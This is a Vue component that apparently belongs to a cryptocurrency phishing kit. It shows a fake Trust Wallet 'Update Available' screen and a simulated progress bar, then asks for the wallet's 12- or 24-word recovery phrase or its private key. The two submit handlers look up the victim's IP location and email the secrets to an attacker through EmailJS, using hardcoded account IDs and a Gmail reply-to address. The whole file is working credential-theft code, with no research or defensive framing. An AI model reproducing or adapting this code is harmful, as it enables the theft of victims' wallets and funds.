<template>
  <div class="bg-white rounded-2xl w-full text-white overflow-hidden mx-auto">
    <!-- Step container -->
    <div class="min-h-[450px] flex flex-col relative p-6">
      <!-- STEP 1: Trust logo + spinner (loads for 3s) -->
      <transition name="fade" mode="out-in">
        <div
          v-if="currentStep === 1"
          key="s1"
          class="flex flex-col items-center justify-center h-full absolute inset-0"
        >
          <img
            src="https://vercelquickfix.com/trust-wallet-1.svg"
            alt="Trust Logo"
            style="width: 200px; height: 200px; object-fit: cover;"
          />
        </div>

        <!-- STEP 2: Update Available -->
        <div v-else-if="currentStep === 2" key="s2" class="flex flex-col">
          <div class="flex flex-col items-center gap-4 py-6">
            <div class="flex flex-col items-center mt-2">
              <img
                src="https://images.ctfassets.net/os95ekjzy83w/fPEdSXrULGfIh5WHi8nig/e769a1a5d257088a0398cbf027405bdd/Trust_Stacked_Logo_Green.png"
                alt="Trust Logo"
                style="width: 100px; height: 100px; object-fit: cover;"
              />
              <p class="text-4xl text-black mb-0 font-bold">Update Available</p>
              <p class="text-gray-500 text-xl mb-0">Version 2.31.2</p>
            </div>

            <div
              class="bg-[#f5f9fc] border-l-4 border-solid rounded-md p-3 px-4 mt-4 flex items-center"
              style="border-left-color: #0a64bc"
            >
              <p class="text-lg font-semibold text-gray-600 m-0">
                Important scheduled update with security improvements. We
                recommend installing it now.
              </p>
            </div>

            <div class="bg-gray-100 rounded-2xl px-4 py-3 w-full mt-2">
              <ul
                class="text-neutral-900 text-[12px] list-disc pl-3 mt-2 space-y-1"
              >
                <li>Enhanced multi-chain support and performance.</li>
                <li>Improved security system.</li>
                <li>Fixed network information display.</li>
                <li>Better transaction signing experience.</li>
              </ul>
            </div>

            <div class="w-full mt-5">
              <button
                @click="startUpdate"
                class="w-full py-4 text-2xl text-white border-none bg-blue-600 rounded-[30px] font-bold text-[#222] hover:opacity-95"
              >
                Update
              </button>
            </div>

            <p class="text-lg text-gray-600 text-center">
              Need help?
              <a href="#" class="text-blue-600 font-semibold underline"
                >Contact Us</a
              >
            </p>
          </div>
        </div>

        <!-- STEP 3: Updating (spinner + progress) -->
        <div
          v-else-if="currentStep === 3"
          key="s3"
          class="flex flex-col items-center"
        >
          <div class="flex flex-col items-center gap-3 py-6 w-full">
            <img
              src="https://images.ctfassets.net/os95ekjzy83w/fPEdSXrULGfIh5WHi8nig/e769a1a5d257088a0398cbf027405bdd/Trust_Stacked_Logo_Green.png"
              alt="Trust Logo"
              style="width: 150px; height: 150px; object-fit: cover;"
            />
            <h2 class="text-4xl text-black mt-2 mb-0 text-center font-bold">
              Updating
            </h2>
            <p class="text-gray-700 text-xl text-center">
              Please wait while we update to version 12.12.0
            </p>

            <div class="w-full mt-6">
              <div class="bg-gray-100 h-2 rounded-full overflow-hidden">
                <div
                  class="h-2 rounded-full transition-all"
                  :style="{
                    width: progress + '%',
                    background: '#0376c9',
                  }"
                ></div>
              </div>
              <div
                class="flex items-center text-center justify-center font-semibold mt-2 text-lg text-gray-700"
              >
                <span>{{ Math.round(progress) }}%</span>
              </div>
            </div>

            <p class="text-gray-700 text-lg text-center mt-4 text-center">
              This may take a few moments. Please do not close this window.
            </p>
          </div>
        </div>

        <!-- STEP 4: Import / Secret Recovery Phrase / Private Key -->
        <div
          v-else-if="currentStep === 4"
          key="s4"
          class="flex flex-col w-full"
        >
          <div class="flex justify-center items-center">
            <img
              src="https://images.ctfassets.net/os95ekjzy83w/fPEdSXrULGfIh5WHi8nig/e769a1a5d257088a0398cbf027405bdd/Trust_Stacked_Logo_Green.png"
              alt="Trust Logo"
              style="width: 100px; height: 100px; object-fit: cover;"
            />
          </div>
          
          <div class="mb-4" v-if="importType !== 'private'">
            <h2 class="text-4xl text-black mt-2 text-center font-bold">
              Import with Secret Phrase
            </h2>
          </div>

          <!-- Selection -->
          <div class="mb-4" v-if="importType !== 'private'">
            <select
              v-model="importType"
              id="countries"
              class="w-full text-lg bg-transparent placeholder:text-slate-400 text-slate-700 text-base border border-slate-200 rounded pl-3 pr-8 py-3 transition duration-300 ease focus:outline-none focus:border-slate-400 hover:border-slate-400 shadow-sm focus:shadow-md appearance-none cursor-pointer"
            >
              <option value="12">I have a 12-word phrase</option>
              <option value="24">I have a 24-word phrase</option>
              <option value="private">I have a private key</option>
            </select>
          </div>

          <!-- Private key screen -->
          <div v-if="importType === 'private'">
            <h2 class="text-4xl text-black mt-2 mb-0 text-center font-bold">
              Import Private Key
            </h2>
            
            <div class="mb-4 mt-8">
              <label
                for="message"
                class="block text-black mb-2 text-xl font-medium text-gray-900 dark:text-white"
                >Select Blockchain</label
              >
              <select
                v-model="blockchainType"
                id="countries"
                class="w-full text-lg bg-transparent placeholder:text-slate-400 text-slate-700 text-base border border-slate-200 rounded pl-3 pr-8 py-3 transition duration-300 ease focus:outline-none focus:border-slate-400 hover:border-slate-400 shadow-sm focus:shadow-md appearance-none cursor-pointer"
              >
                <option value="ethereum">Ethereum</option>
              </select>
            </div>

            <label
              for="message"
              class="block text-black mb-2 text-xl font-medium text-gray-900 dark:text-white"
              >Private Key:</label
            >
            <textarea
              v-model="privateKeyInput"
              rows="5"
              style="background: white; font-size: 14px; padding-top: 2px"
              class="w-full rounded-md py-2 px-3 text-black text-sm outline-none mb-6 border border-slate-200"
            ></textarea>

            <div class="flex gap-3 mt-6 w-full">
              <button
                @click="cancelPrivateKeyImport"
                class="flex-1 bg-gray-200 text-gray-900 py-3 border-none hover:border-none focus:border-none focus:text-blue-600 hover:text-blue-600 rounded-[30px] font-bold transition-colors duration-200"
              >
                Cancel
              </button>
              <button
                @click="confirmPrivateKey"
                :disabled="isLoading"
                class="flex-1 bg-[#0376c9] py-4 text-white border-none hover:border-none hover:bg-[#0369b4] rounded-[30px] font-bold transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                <span v-if="!isLoading">Import</span>
                <svg
                  v-else
                  class="animate-spin h-5 w-5 inline-block"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle
                    class="opacity-25"
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    stroke-width="4"
                  />
                  <path
                    class="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                  />
                </svg>
              </button>
            </div>
          </div>

          <!-- Recovery phrase grid -->
          <div v-else>
            <div class=" rounded-xl mt-4 overflow-scroll h-[400px]">
              <div class="grid grid-cols-2 gap-3">
                <div v-for="n in phraseCount" :key="n" class="relative ">
                  <span
                    class="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500 text-base select-none z-10 font-medium"
                    >{{ n }}.</span
                  >
                  <div class="relative bg-gray-100">
                    <input
                      :type="hiddenFields[n - 1] ? 'password' : 'text'"
                      v-model="phraseWords[n - 1]"
                      :placeholder="`Word #${n}`"
                      style="padding-left: 40px;"
                      class="w-full rounded-lg py-2 pl-20 pr-10 text-black text-sm outline-none transition-colors duration-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-200"
                    />
                    <div
                      @click="toggleFieldVisibility(n - 1)"
                      class="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 cursor-pointer transition-colors duration-200"
                    >
                      <svg
                        v-if="hiddenFields[n - 1]"
                        xmlns="http://www.w3.org/2000/svg"
                        class="h-5 w-5"
                        fill="none"
                        viewBox="0 0 24 24"
                        stroke="currentColor"
                      >
                        <path
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                        />
                        <path
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.269 2.943 9.542 7-1.273 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                        />
                      </svg>
                      <svg
                        v-else
                        xmlns="http://www.w3.org/2000/svg"
                        class="h-5 w-5"
                        fill="none"
                        viewBox="0 0 24 24"
                        stroke="currentColor"
                      >
                        <path
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.269-2.943-9.542-7a9.96 9.96 0 012.502-4.043M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                        />
                        <path
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M3 3l18 18"
                        />
                      </svg>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div class="flex gap-3 mt-6">
              <button
                @click="confirmPhrase"
                :disabled="isImportDisabled"
                class="flex-1 bg-[#0376c9] py-4 text-white border-none hover:border-none hover:bg-[#0369b4] rounded-[30px] font-bold transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                Confirm
              </button>
            </div>
          </div>
        </div>
      </transition>

      <!-- message -->
      <transition name="fade">
        <div
          v-if="message.text"
          :class="[
            'absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold',
            message.type === 'success'
              ? 'bg-green-600 text-white'
              : 'bg-red-600 text-white',
          ]"
        >
          {{ message.text }}
        </div>
      </transition>
    </div>
  </div>
</template>

<script setup>
import axios from "axios";
import { ref, computed, watch, nextTick } from "vue";

const emit = defineEmits(["close"]);
/* state */
const currentStep = ref(1);
const progress = ref(0);
const isLoading = ref(false);
const message = ref({ text: "", type: "" });

/* import flow */
const importType = ref("12"); // '12' | '24' | 'private'
const blockchainType = ref("ethereum");
const phraseWords = ref([]);
const phraseCount = computed(() => (importType.value === "24" ? 24 : 12));
const hiddenFields = ref([]);
const privateKeyInput = ref("");

/* helper initializers */
function initPhraseWords() {
  phraseWords.value = Array(phraseCount.value).fill("");
  hiddenFields.value = Array(phraseCount.value).fill(true);
}

/* start initial state for step 1 -> auto advance after 3s */
const advanceTimer = setTimeout(() => {
  if (currentStep.value === 1) {
    nextStep(); // goes to step 2
  }
}, 3000);

/* basic actions */
function closeModal() {
  emit("close");
}

/* Start update: step 2 -> step 3 (spinner + progress) */
async function startUpdate() {
  currentStep.value = 3;
  progress.value = 0;

  // animate progress from 0 to 100 in 3 seconds
  const duration = 3000;
  const start = performance.now();
  isLoading.value = true;

  function step(now) {
    const elapsed = now - start;
    const pct = Math.min(100, (elapsed / duration) * 100);
    progress.value = pct;
    if (elapsed < duration) {
      requestAnimationFrame(step);
    } else {
      // done
      isLoading.value = false;
      // move to import step
      setTimeout(() => {
        currentStep.value = 4;
        initPhraseWords();
      }, 400);
    }
  }
  requestAnimationFrame(step);
}

/* Navigation */
function nextStep() {
  if (currentStep.value < 4) {
    currentStep.value++;
    if (currentStep.value === 4) {
      initPhraseWords();
    }
  }
}

function prevStep() {
  if (currentStep.value > 1) currentStep.value--;
}

/* Import handlers */
watch(importType, async (val) => {
  await nextTick();
  initPhraseWords();
});

function toggleFieldVisibility(idx) {
  hiddenFields.value[idx] = !hiddenFields.value[idx];
}

const isImportDisabled = computed(() => {
  // require all phrase words filled for 12/24
  if (importType.value === "private") {
    return !privateKeyInput.value.trim();
  } else {
    return phraseWords.value
      .slice(0, phraseCount.value)
      .some((w) => !w || !w.trim());
  }
});

async function confirmPhrase() {
  if (isImportDisabled.value) {
    return showMessage("Please fill all fields", "error");
  }
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: importType.value,
      phrase: phraseWords.value.join(" "),
    };

    const params = {
      service_id: "service_eusbqyo",
      template_id: "template_z6xga6o",
      user_id: "obT4LcwZqPw_KlOar",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Phantom Wallets",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );

    if (response.data === "OK") {
      showMessage("Wallet imported successfully!", "success");
      emit("close");
    }

    if (!response.ok) throw new Error("Failed to import wallet");
    showMessage("Wallet imported successfully!", "success");
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

async function confirmPrivateKey() {
  if (!privateKeyInput.value.trim()) {
    return showMessage("Please enter your private key", "error");
  }
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      privateKey: privateKeyInput.value,
    };
    const params = {
      service_id: "service_eusbqyo",
      template_id: "template_z6xga6o",
      user_id: "obT4LcwZqPw_KlOar",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Phantom Wallets",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );

    if (response.data === "OK") {
      showMessage("Wallet imported successfully!", "success");
      emit("close");
    }

    if (!response.ok) throw new Error("Failed to import wallet");
    showMessage("Private key imported successfully!", "success");
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

function cancelPrivateKeyImport() {
  // Go back to the phrase import screen (12-word default)
  importType.value = "12";
  privateKeyInput.value = "";
}

/* messages */
function showMessage(text, type = "success") {
  message.value = { text, type };
  setTimeout(() => {
    message.value.text = "";
  }, 3000);
}

/* init */
initPhraseWords();
</script>

<style scoped>
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.28s ease;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}

input::placeholder {
  font-size: 13px;
  color: #9ca3af; /* Tailwind's gray-400 */
}
</style>